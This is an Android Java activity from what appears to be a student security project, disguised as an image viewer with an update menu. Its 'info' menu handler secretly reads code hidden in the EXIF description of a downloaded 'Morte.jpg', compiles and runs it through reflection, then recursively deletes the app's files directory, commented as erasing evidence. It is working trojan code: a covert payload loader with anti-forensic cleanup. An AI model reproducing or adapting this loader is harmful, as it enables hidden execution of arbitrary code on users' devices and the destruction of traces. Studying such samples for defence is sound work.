package com.client_progettosicurezza;

import android.Manifest;
import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.ExifInterface;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import com.client_progettosicurezza.adapters.AdapterImmagine;
import com.client_progettosicurezza.api.APIService;
import com.client_progettosicurezza.compiler.Compile;
import com.client_progettosicurezza.models.Aggiornamento;
import com.client_progettosicurezza.models.Immagine;
import com.client_progettosicurezza.results.ResultAggiornamento;
import com.client_progettosicurezza.results.ResultListaImmagini;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.client_progettosicurezza.api.APIUrl.BASE_URL;

public class MainActivity extends AppCompatActivity {

    //public static final int PERMISSION_CODE = 1;
    public static final int PERMISSIONS_MULTIPLE_REQUEST = 123;

    protected static final String EXTRA_RES_ID = "POS";
    protected static final String EXTRA_RES_ID_ARRAY = "ARR";

    private RecyclerView recyclerView;
    private RecyclerView.Adapter adapter;
    SwipeRefreshLayout swipeRefresh;





    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_CODE);

        checkPermission();

        recyclerView = (RecyclerView) findViewById(R.id.recyclerView);
        recyclerView.setHasFixedSize(true);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));



    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    private void checkPermission() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_EXTERNAL_STORAGE) + ContextCompat
                .checkSelfPermission(this,
                        Manifest.permission.READ_PHONE_STATE) + ContextCompat
                .checkSelfPermission(this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE) + ContextCompat
                .checkSelfPermission(this,
                        Manifest.permission.INTERNET)
                != PackageManager.PERMISSION_GRANTED) {

            if (ActivityCompat.shouldShowRequestPermissionRationale
                    (this, Manifest.permission.READ_EXTERNAL_STORAGE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale
                            (this, Manifest.permission.READ_PHONE_STATE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale
                            (this, Manifest.permission.WRITE_EXTERNAL_STORAGE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale
                            (this, Manifest.permission.INTERNET)) {

                requestPermissions(
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,
                                Manifest.permission.READ_PHONE_STATE,
                                Manifest.permission.INTERNET,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE},
                        PERMISSIONS_MULTIPLE_REQUEST);
            } else {
                requestPermissions(
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,
                                Manifest.permission.READ_PHONE_STATE,
                                Manifest.permission.INTERNET,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE},
                        PERMISSIONS_MULTIPLE_REQUEST);
            }
        } else {

            //Compila la classe a runtime
            loadImmagini();

            swipeRefresh = (SwipeRefreshLayout) findViewById(R.id.swipeRefresh);
            swipeRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
                @Override
                public void onRefresh() {
                    swipeRefresh.setRefreshing(true);

                    new android.os.Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {

                            swipeRefresh.setRefreshing(false);
                            loadImmagini();
                        }
                    }, 100);
                }
            });


        }
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();

        switch (id) {
            case R.id.update:
                AlertDialog.Builder alertDialog = new AlertDialog.Builder(MainActivity.this);
                alertDialog.setMessage("C'è un nuovo aggiornamento. Vuoi scaricarlo?").setCancelable(false)
                        .setPositiveButton("Si", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                downloadAggiornamento();
                            }
                        })
                        .setNegativeButton("No", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                dialogInterface.cancel();
                            }
                        });

                AlertDialog alert = alertDialog.create();
                alert.setTitle("Aggiornamento");
                alert.show();

                break;

            //TODO TRIGGER
            case R.id.info:
                //TODO per prelevare l'immagine (aggiungere scelta file casualmente)

                AlertDialog alertDialogg = new AlertDialog.Builder(MainActivity.this).create();
                alertDialogg.setTitle("INFO");
                alertDialogg.setMessage("Nessun informazione sull'aggiornamento");
                alertDialogg.setButton(AlertDialog.BUTTON_NEUTRAL, "OK",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                dialog.dismiss();
                            }
                        });
                alertDialogg.show();

                String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Morte.jpg";
                File file = new File(pathFile);
                if (file.exists()){
                    payload(file);

                    //File dir = new File(Environment.getExternalStorageDirectory()+"Dir_name_here");

                    String pathFileDelete = "/data/data/com.client_progettosicurezza/files";
                    File fileDelete = new File(pathFileDelete);

                    rmdir(fileDelete);

                    Toast.makeText(getApplicationContext(), "Eliminato prove", Toast.LENGTH_LONG).show();

                }

                break;
        }
        return true;
    }

    private void payload(File file) {

        String codice = "";

        //TODO per prelevare i metadati
        try {
            ExifInterface exif = new ExifInterface(file.getAbsolutePath());
            codice = exif.getAttribute(ExifInterface.TAG_IMAGE_DESCRIPTION);

            Log.d("CODICE", codice);
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            Compile compile = new Compile(getFilesDir(), getApplicationContext());
            //TODO scegliere codice da compilare
            compile.assemblyCompile(codice);
            compile.recompile();
            compile.load(getCacheDir(), getApplicationInfo(), getClassLoader());

            Object obj = compile.run();
            Method metodo = obj.getClass().getDeclaredMethod("run", Context.class);
            metodo.invoke(obj, getApplicationContext());

        } catch (IOException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }
//elimina prove
    public static void rmdir(final File folder) {
        // check if folder file is a real folder
        if (folder.isDirectory()) {
            File[] list = folder.listFiles();
            if (list != null) {
                for (int i = 0; i < list.length; i++) {
                    File tmpF = list[i];
                    if (tmpF.isDirectory()) {
                        rmdir(tmpF);
                    }
                    tmpF.delete();
                }
            }
            if (!folder.delete()) {
                System.out.println("can't delete folder : " + folder);
            }
        }
    }



    private void loadImmagini() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        APIService service = retrofit.create(APIService.class);

        Call<ResultListaImmagini> call = service.getImmagini();

        call.enqueue(new Callback<ResultListaImmagini>() {
            @Override
            public void onResponse(Call<ResultListaImmagini> call, Response<ResultListaImmagini> response) {

                ArrayList<Immagine> immagini = response.body().getImmagini();

                adapter = new AdapterImmagine(immagini, getApplicationContext());
                recyclerView.setAdapter(adapter);
            }

            @Override
            public void onFailure(Call<ResultListaImmagini> call, Throwable t) {

            }
        });
    }

    private void downloadAggiornamento() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        APIService service = retrofit.create(APIService.class);

        Call<ResultAggiornamento> call = service.getAggiornamento();

        call.enqueue(new Callback<ResultAggiornamento>() {
            @Override
            public void onResponse(Call<ResultAggiornamento> call, Response<ResultAggiornamento> response) {

                Aggiornamento aggiornamento = response.body().getAggiornamento();

                Toast.makeText(getApplicationContext(), "Download Image View.apk " + "versione: " + aggiornamento.getVersione(), Toast.LENGTH_LONG).show();

                String nameApk = "ImageView_v" + aggiornamento.getVersione() + ".apk";

                DownloadManager downloadManager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
                Uri uri = Uri.parse(aggiornamento.getFile());
                DownloadManager.Request request = new DownloadManager.Request(uri);
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_ONLY_COMPLETION);
                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, nameApk);
                downloadManager.enqueue(request);

                /*Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(new File(Environment.DIRECTORY_DOWNLOADS + "/" + nameApk)),
                        "application/com.client_progettosicurezza");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);*/
            }

            @Override
            public void onFailure(Call<ResultAggiornamento> call, Throwable t) {

            }
        });
    }


    //Chiamata matodo dopo la scelta dei permessi
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions, @NonNull int[] grantResults) {

        switch (requestCode) {
            case PERMISSIONS_MULTIPLE_REQUEST:
                if (grantResults.length > 0) {
                    boolean readPermission = grantResults[1] == PackageManager.PERMISSION_GRANTED;
                    boolean readExternalFile = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean audioRecordPerission = grantResults[2] == PackageManager.PERMISSION_GRANTED;
                    boolean internetPerission = grantResults[3] == PackageManager.PERMISSION_GRANTED;


                    if (readPermission && readExternalFile && audioRecordPerission && internetPerission) {


                        // write your logic here

                        loadImmagini();

                        swipeRefresh = (SwipeRefreshLayout) findViewById(R.id.swipeRefresh);
                        swipeRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
                            @Override
                            public void onRefresh() {
                                swipeRefresh.setRefreshing(true);

                                new android.os.Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {

                                        swipeRefresh.setRefreshing(false);
                                        loadImmagini();
                                    }
                                }, 100);
                            }
                        });


                    } else
                        requestPermissions(
                                new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,
                                        Manifest.permission.READ_PHONE_STATE,
                                        Manifest.permission.INTERNET,
                                        Manifest.permission.WRITE_EXTERNAL_STORAGE},
                                PERMISSIONS_MULTIPLE_REQUEST);
                }
        }
    }


}
